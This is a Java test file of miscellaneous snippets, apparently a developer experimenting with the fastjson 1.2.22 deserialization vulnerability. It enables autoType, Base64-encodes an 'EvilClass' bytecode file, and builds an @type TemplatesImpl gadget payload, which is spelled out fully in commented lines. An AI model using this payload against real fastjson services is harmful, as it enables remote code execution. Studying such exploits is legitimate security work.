package com.hzk.test;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import com.google.common.base.Splitter;
import org.apache.commons.io.IOUtils;
import org.junit.Test;
import org.openjdk.jmh.util.FileUtils;

import java.io.File;
import java.io.FileInputStream;
import java.io.OutputStream;
import java.io.Serializable;
import java.net.URI;
import java.net.URL;
import java.net.URLDecoder;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.security.SecureRandom;
import java.util.ArrayList;
import java.util.Base64;
import java.util.Collections;
import java.util.Comparator;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Timer;
import java.util.TimerTask;
import java.util.stream.Collectors;

/**
 * <dependency>
*             <groupId>com.alibaba</groupId>
*             <artifactId>fastjson</artifactId>
*             <version>1.2.22</version>
*         </dependency>
 */
public class Test1 {

    static {
        // fastJson，autoType开关
        System.setProperty("fastjson.parser.autoTypeSupport", "true");
    }

    private static class FlameGraphVO {
        private String status;
        private int seconds;

        public FlameGraphVO(String status, int seconds) {
            this.status = status;
            this.seconds = seconds;
        }

        public String getStatus() {
            return status;
        }

        public void setStatus(String status) {
            this.status = status;
        }

        public int getSeconds() {
            return seconds;
        }

        public void setSeconds(int seconds) {
            this.seconds = seconds;
        }
    }


    public static void main(String[] args) throws Exception {





        String url = "http://127.0.0.1:8080/aa";
        String params = "?key1=a&key2=%";
        params = URLEncoder.encode(params, "utf-8");
        URI uri = URI.create(url + params);


        System.out.println("start");

        FlameGraphVO flameGraphVO1 = new FlameGraphVO("OK", 30);
        FlameGraphVO flameGraphVO2 = new FlameGraphVO("Error", 40);
        FlameGraphVO flameGraphVO3 = new FlameGraphVO("Error", 30);
        FlameGraphVO flameGraphVO4 = new FlameGraphVO("Error", 50);

        List<FlameGraphVO> list = new ArrayList<>();
        Collections.addAll(list, flameGraphVO1, flameGraphVO2, flameGraphVO3, flameGraphVO4);

        List<FlameGraphVO> list1 = list.stream()
                .filter((tempGraphVO) -> tempGraphVO.getStatus().equals("Error"))
                .sorted(Comparator.comparingInt(FlameGraphVO::getSeconds)).collect(Collectors.toList());


        Timer timer = new Timer();
        timer.schedule(new TimerTask(){
            @Override
            public void run() {
                System.out.println("timer111");
            }
        }, 1000);



        System.in.read();

//        String urlString = "http://localhost:8080/ierp/mobile.html?accountId=1150550063915728896&loginConfigNumber=hzk&bizUserId=003&bizCustomParam=myDiyParam666";
//        URL url = new URL(urlString);
//        String query = url.getQuery();


        String urlString1 = "accountId=1150550063915728896&loginConfigNumber=hzk&bizUserId=003&bizCustomParam=myDiyParam666";

        Map<String, String> queryMap = Splitter.onPattern("&").trimResults().withKeyValueSeparator("=").split(urlString1);



        String clazzPath = "target/classes/com/hzk/test/EvilClass.class";
        byte[] bytes = IOUtils.toByteArray(new FileInputStream(clazzPath));
        byte[] base64Bytes = Base64.getEncoder().encode(bytes);
        String evilCode = new String(base64Bytes);

        String NASTY_CLASS = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
//        JSONObject jsonObject = new JSONObject();
//        jsonObject.put("@type", NASTY_CLASS);
//        jsonObject.put("_bytecodes", "[" + evilCode + "],'_name':'a.b','_tfactory':{}");
//        jsonObject.put("_version", "1.0");
//        jsonObject.put("allowedProtocols", "all");
//        jsonObject.put("transletName", "a");



        JSONObject jsonObject = new JSONObject();
        jsonObject.put("@type", NASTY_CLASS);
        jsonObject.put("transletName", "a");
        String text1 = JSON.toJSONString(jsonObject);


//        text1 = "{\"@type\":\"" + NASTY_CLASS +
//                "\",\"_bytecodes\":[\""+evilCode+"\"],'_name':'a.b','_tfactory':{ },\"_outputProperties\":{ }," +
//                "\"_name\":\"a\",\"_version\":\"1.0\",\"allowedProtocols\":\"all\"}\n";
        System.out.println(text1);
        System.out.println("---------------------------------");


        Object object1 = JSON.parseObject(text1);
        System.out.println(object1);







    }


    public static void method1(){
        String userJson = "{\"@type\":\"com.hzk.test.UserDTO\",\"name\":\"testUserName\"}";
        /**
         * construct
         * setName
         * getName
         */
        // JSONObject
        Object object1 = JSON.parseObject(userJson);
        System.out.println("=============");
        //parse
        /**com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl
         * construct
         * setName
         */
        // object
//        Object object2 = JSON.parse(userJson);
//        System.out.println(object1);
    }



}
